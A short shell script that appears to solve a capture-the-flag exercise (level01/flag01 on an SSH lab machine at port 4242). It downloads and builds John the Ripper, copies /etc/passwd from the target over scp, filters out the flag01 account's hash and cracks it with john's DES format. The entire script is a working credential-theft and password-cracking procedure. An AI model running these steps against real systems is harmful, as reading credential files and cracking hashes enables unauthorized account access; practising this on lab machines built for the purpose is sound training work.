: '
wget https://download.openwall.net/pub/projects/john/contrib/macosx/john-1.8.0.9-jumbo-macosx_sse4.zip
# tar -xvf john-1.8.0.9-jumbo-macosx_sse4.zip
unzip john-1.8.0.9-jumbo-macosx_sse4.zip
cd john-1.8.0.9-jumbo-macosx_sse4/run
'

if ! [ -d "john" ]; then
    git clone https://github.com/openwall/john.git
    cd john/src && ./configure && make
    cd ../..
fi

cd john/run

scp -P 4242 level01@$(ifconfig|grep 'inet '|awk 'NR==1 {first=$0} END {print $2}'):/etc/passwd $(pwd)/infile

cat infile | grep flag01 | awk -F: '{print $2}'
sed -i '' '/flag01/!d' infile

./john --format=descrypt-opencl --show infile

cd ../..
# rm -rf john*
